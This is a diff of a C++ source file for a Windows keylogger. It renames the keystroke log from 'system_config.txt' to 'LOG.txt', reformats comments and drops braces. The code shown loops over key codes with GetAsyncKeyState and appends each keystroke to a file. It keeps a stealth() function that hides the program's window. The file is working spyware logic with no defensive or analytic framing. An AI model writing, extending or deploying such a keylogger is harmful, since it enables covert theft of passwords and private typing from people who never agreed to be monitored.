@@ -1,5 +1,3 @@
-#include "stdafx.h"
-
 #include <iostream>
 #include <fstream>
 #include <string>
@@ -7,15 +5,17 @@
 #include <Windows.h>
 #include <winuser.h>
 
+using namespace std;
 
-using namespace std; 
-
-// Debug global var
-// When is activated the windows does not stealth and some output will appear on it
+/*
+ * DEBUG global var
+ *
+ * When is activated the windows does not stealth 
+ * and some output will appear on it
+ */
 bool DEBUG = true;
 
-// Path for the keylog file
-char *FILE_PATH_NAME = "system_config.txt";
+char *LOG_PATH_NAME = "LOG.txt";
 
 // Function headers
 int saveKey (int key_stroke, ofstream *file);
@@ -31,21 +31,15 @@ int main()
 
 	// Opens the stream
 	ofstream OUTPUT_FILE;
-	OUTPUT_FILE.open(FILE_PATH_NAME, ofstream::app);
+	OUTPUT_FILE.open(LOG_PATH_NAME, ofstream::app);
 
 	initialize(&OUTPUT_FILE);
 
 	// Main loop
 	while(true)
-	{
 		for(i = 8; i <= 190; i++)
-		{
 			if (GetAsyncKeyState(i) == -32767)
-			{
 				saveKey(i, &OUTPUT_FILE);
-			}
-		}
-	}
 
     return 0;
 }
@@ -120,7 +114,7 @@ void stealth()
     ShowWindow(stealth,0);
 }
 
-// Initializes the file with some info for the session
+// Initializes LOG.txt file with some info for the session
 void initialize(ofstream *file)
 {
 	string dateTime = currentDateTime();
